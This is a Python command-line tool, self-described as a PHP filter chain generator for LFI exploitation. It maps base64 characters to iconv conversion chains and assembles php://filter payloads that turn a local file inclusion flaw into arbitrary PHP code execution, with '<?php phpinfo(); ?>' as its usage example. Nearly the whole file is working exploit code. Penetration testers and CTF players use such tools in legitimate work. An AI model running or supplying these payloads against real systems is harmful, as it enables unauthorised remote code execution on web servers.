#!/usr/bin/env python3
import argparse
import base64
import re
import json
import sys

# - Useful infos -
# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

# No need to guess a valid filename anymore
file_to_use = "php://temp"

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

class FilterChainError(Exception):
    """Custom exception for filter chain generation errors."""
    pass

def validate_input(input_string, input_type="chain"):
    """
    Validate input string for specific requirements.
    
    Args:
        input_string (str): The input string to validate
        input_type (str): Type of input ('chain' or 'base64')
    
    Returns:
        bool: True if valid
    
    Raises:
        FilterChainError: If validation fails
    """
    if not input_string:
        raise FilterChainError(f"Empty {input_type} provided")
    
    if input_type == "base64":
        # Validate base64 characters
        if not re.match("^[A-Za-z0-9+/]*={0,2}$", input_string):
            raise FilterChainError("Invalid base64 string. Only alphanumeric characters, +, /, and = are allowed")
    
    elif input_type == "chain":
        # For chain input, we allow any printable ASCII characters
        # but warn about potentially problematic characters
        try:
            input_string.encode('utf-8')
        except UnicodeEncodeError:
            raise FilterChainError("Input contains non-UTF-8 characters")
        
        # Check for null bytes or other control characters that might cause issues
        if '\x00' in input_string:
            raise FilterChainError("Input contains null bytes which may cause issues")
    
    return True

def auto_pad_base64(base64_string):
    """
    Automatically pad base64 string to ensure it's properly formatted.
    
    Args:
        base64_string (str): Base64 string that may need padding
    
    Returns:
        str: Properly padded base64 string
    """
    # Remove existing padding
    base64_string = base64_string.rstrip('=')
    
    # Calculate required padding
    padding_needed = (4 - len(base64_string) % 4) % 4
    
    # Add padding
    return base64_string + '=' * padding_needed

def generate_filter_chain(chain, debug_base64=False):
    """
    Generate PHP filter chain for the given input.
    
    Args:
        chain (str): The base64 encoded chain
        debug_base64 (bool): Whether to output base64 debug format
    
    Returns:
        str: Generated filter chain
    
    Raises:
        FilterChainError: If chain generation fails
    """
    try:
        encoded_chain = chain
        
        # Validate that all characters in the chain are supported
        for c in encoded_chain:
            if c not in conversions:
                raise FilterChainError(f"Unsupported character '{c}' in base64 string")
        
        # Generate some garbage base64
        filters = "convert.iconv.UTF8.CSISO2022KR|"
        filters += "convert.base64-encode|"
        # Make sure to get rid of any equal signs in both the string we just generated and the rest of the file
        filters += "convert.iconv.UTF8.UTF7|"

        for c in encoded_chain[::-1]:
            filters += conversions[c] + "|"
            # Decode and reencode to get rid of everything that isn't valid base64
            filters += "convert.base64-decode|"
            filters += "convert.base64-encode|"
            # Get rid of equal signs
            filters += "convert.iconv.UTF8.UTF7|"
        
        if not debug_base64:
            # Don't add the decode while debugging chains
            filters += "convert.base64-decode"

        final_payload = f"php://filter/{filters}/resource={file_to_use}"
        return final_payload
    
    except Exception as e:
        raise FilterChainError(f"Failed to generate filter chain: {str(e)}")

def output_result(result_data, output_format="text"):
    """
    Output the result in the specified format.
    
    Args:
        result_data (dict): Dictionary containing result information
        output_format (str): Output format ('text' or 'json')
    """
    if output_format == "json":
        print(json.dumps(result_data, indent=2))
    else:
        # Text format (default)
        if "error" in result_data:
            print(f"[-] Error: {result_data['error']}")
        else:
            print(f"[+] The following gadget chain will generate the following code: {result_data['original_input']} (base64 value: {result_data['base64_value']})")
            print(result_data['filter_chain'])

def main():
    # Parsing command line arguments
    parser = argparse.ArgumentParser(
        description="PHP filter chain generator for LFI exploitation.",
        epilog="Example: python3 %(prog)s --chain '<?php phpinfo(); ?>' --output json"
    )

    parser.add_argument(
        "--chain", 
        help="Content you want to generate (automatic base64 padding applied)", 
        required=False
    )
    parser.add_argument(
        "--rawbase64", 
        help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", 
        required=False
    )
    parser.add_argument(
        "--output", 
        choices=["text", "json"], 
        default="text",
        help="Output format (default: text)"
    )
    parser.add_argument(
        "--no-padding", 
        action="store_true",
        help="Disable automatic base64 padding for --chain input"
    )
    
    args = parser.parse_args()
    
    # Validate that at least one argument is provided
    if not args.chain and not args.rawbase64:
        parser.error("Either --chain or --rawbase64 must be provided")
    
    # Validate that both arguments are not provided simultaneously
    if args.chain and args.rawbase64:
        parser.error("Cannot use both --chain and --rawbase64 simultaneously")
    
    result_data = {}
    
    try:
        if args.chain is not None:
            # Validate chain input
            validate_input(args.chain, "chain")
            
            # Encode to base64
            chain_bytes = args.chain.encode('utf-8')
            base64_value = base64.b64encode(chain_bytes).decode('utf-8')
            
            # Apply automatic padding unless disabled
            if not args.no_padding:
                base64_value = auto_pad_base64(base64_value)
            
            # Remove padding for filter generation
            base64_for_filter = base64_value.replace("=", "")
            
            # Generate filter chain
            filter_chain = generate_filter_chain(base64_for_filter)
            
            result_data = {
                "original_input": args.chain,
                "base64_value": base64_value,
                "base64_for_filter": base64_for_filter,
                "filter_chain": filter_chain,
                "auto_padding_applied": not args.no_padding
            }
            
        elif args.rawbase64 is not None:
            # Validate base64 input
            validate_input(args.rawbase64, "base64")
            
            # Remove padding for processing
            rawbase64 = args.rawbase64.replace("=", "")
            
            # Generate debug filter chain
            filter_chain = generate_filter_chain(rawbase64, True)
            
            result_data = {
                "original_base64": args.rawbase64,
                "base64_for_filter": rawbase64,
                "filter_chain": filter_chain,
                "debug_mode": True
            }
        
        # Output result
        output_result(result_data, args.output)
        
    except FilterChainError as e:
        result_data = {"error": str(e)}
        output_result(result_data, args.output)
        sys.exit(1)
    except Exception as e:
        result_data = {"error": f"Unexpected error: {str(e)}"}
        output_result(result_data, args.output)
        sys.exit(1)

if __name__ == "__main__":
    main()
